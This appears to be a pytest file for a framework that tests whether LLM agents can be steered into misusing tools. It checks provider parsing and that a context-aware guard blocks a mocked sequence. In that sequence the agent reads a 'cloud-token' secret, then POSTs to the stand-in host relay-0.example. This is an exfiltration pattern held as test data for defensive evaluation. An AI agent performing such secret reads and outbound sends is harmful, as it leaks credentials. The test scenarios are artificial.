import json

import pytest

from src.agent.context_aware_agent import ContextAwareAgent
from src.agent.baseline_agent import BaselineAgent
from src.evaluation.extended_dataset import load_extended_scenarios
from src.models.schemas import Decision
from src.providers.base import ProviderConfigurationError, ProviderResponseError
from src.providers.ollama_provider import OllamaProvider
from src.providers.openai_provider import OpenAIProvider
from src.sandbox.environment import FakeEnvironment
from src.tools.registry import build_default_registry


class FakeTransport:
    def __init__(self, responses):
        self.responses = list(responses)
        self.requests = []

    def request(self, url, **kwargs):
        self.requests.append((url, kwargs))
        return self.responses.pop(0)


def tools():
    return build_default_registry(FakeEnvironment()).list_metadata()


def attack(category):
    return next(item for item in load_extended_scenarios("attack") if item.category == category)


def test_openai_provider_requires_environment_key(monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    provider = OpenAIProvider("test-model")
    with pytest.raises(ProviderConfigurationError, match="OPENAI_API_KEY"):
        provider.ensure_available()


def test_openai_parses_strict_function_call_and_usage():
    transport = FakeTransport([{
        "output": [{"type": "function_call", "name": "read_file", "arguments": json.dumps({"path": "deployment.yaml"})}],
        "usage": {"input_tokens": 120, "output_tokens": 12, "total_tokens": 132},
    }])
    provider = OpenAIProvider("test-model", api_key="test-only", transport=transport)
    call = provider.propose_tool_call("Review manifest", [], tools(), [])
    assert call.tool_name == "read_file"
    assert call.arguments == {"path": "deployment.yaml"}
    assert provider.usage.input_tokens == 120
    assert provider.usage.output_tokens == 12
    payload = transport.requests[0][1]["payload"]
    assert payload["parallel_tool_calls"] is False
    assert all(item["strict"] is True for item in payload["tools"])


def test_openai_malformed_arguments_fail_without_tool_execution():
    transport = FakeTransport([{
        "output": [{"type": "function_call", "name": "run_shell", "arguments": "not-json"}],
        "usage": {"input_tokens": 10, "output_tokens": 2},
    }])
    provider = OpenAIProvider("test-model", api_key="test-only", transport=transport)
    with pytest.raises(ProviderResponseError, match="malformed"):
        provider.propose_tool_call("Run tests", [], tools(), [])


def test_malformed_provider_response_is_recorded_without_execution():
    transport = FakeTransport([{
        "output": [{"type": "function_call", "name": "run_shell", "arguments": "not-json"}],
        "usage": {"input_tokens": 10, "output_tokens": 2},
    }])
    provider = OpenAIProvider("test-model", api_key="test-only", transport=transport)
    registry = build_default_registry(FakeEnvironment())
    result = BaselineAgent(registry, provider).run(attack("direct_instruction"))
    assert result.events == []
    assert "malformed" in result.provider_error
    assert registry.environment.shell_events == []


def test_ollama_parses_native_tool_call_and_usage():
    transport = FakeTransport([{
        "message": {"role": "assistant", "content": "", "tool_calls": [{"function": {"name": "list_k8s_pods", "arguments": {"namespace": "default"}}}]},
        "prompt_eval_count": 80,
        "eval_count": 9,
    }])
    provider = OllamaProvider("llama-test", transport=transport)
    call = provider.propose_tool_call("List pods", [], tools(), [])
    assert call.tool_name == "list_k8s_pods"
    assert provider.usage.total_tokens == 89


def test_context_agent_uses_model_history_to_block_sequence():
    responses = [
        {"output": [{"type": "function_call", "name": "read_secret", "arguments": '{"name":"cloud-token"}'}], "usage": {"input_tokens": 10, "output_tokens": 2}},
        {"output": [{"type": "function_call", "name": "http_request", "arguments": '{"url":"https://relay-0.example/attest","method":"POST","body":"runtime_proof"}'}], "usage": {"input_tokens": 15, "output_tokens": 3}},
        {"output": [], "usage": {"input_tokens": 20, "output_tokens": 1}},
    ]
    provider = OpenAIProvider("test-model", api_key="test-only", transport=FakeTransport(responses), max_steps=3)
    registry = build_default_registry(FakeEnvironment())
    result = ContextAwareAgent(registry, provider).run(attack("history_only"))
    assert [event.decision for event in result.events] == [Decision.ALLOW, Decision.BLOCK]
    assert result.attack_succeeded is False
    assert result.llm_calls == 3
    assert result.total_tokens == 51
